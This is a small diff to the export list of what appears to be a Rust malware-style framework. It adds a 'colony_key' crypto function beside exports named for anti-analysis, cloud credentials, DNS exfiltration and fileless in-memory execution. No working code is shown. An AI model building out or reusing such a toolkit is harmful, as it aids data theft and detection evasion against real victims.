@@ -64,7 +64,9 @@ pub use anti_analysis::AntiAnalysis;
 pub use cloud_worker::{CloudCredential, CloudProvider, CloudResult, CloudWorker};
 pub use comms::HiveChamber;
 pub use consensus::ConsensusEngine;
-pub use crypto::{decrypt_chacha20, decrypt_model, derive_key, derive_seed, encrypt_chacha20};
+pub use crypto::{
+    colony_key, decrypt_chacha20, decrypt_model, derive_key, derive_seed, encrypt_chacha20,
+};
 pub use exfil::{dns_exfiltrate, ExfilScheduler};
 pub use fileless::MemfdBinary;
 pub use identity::AgentIdentity;
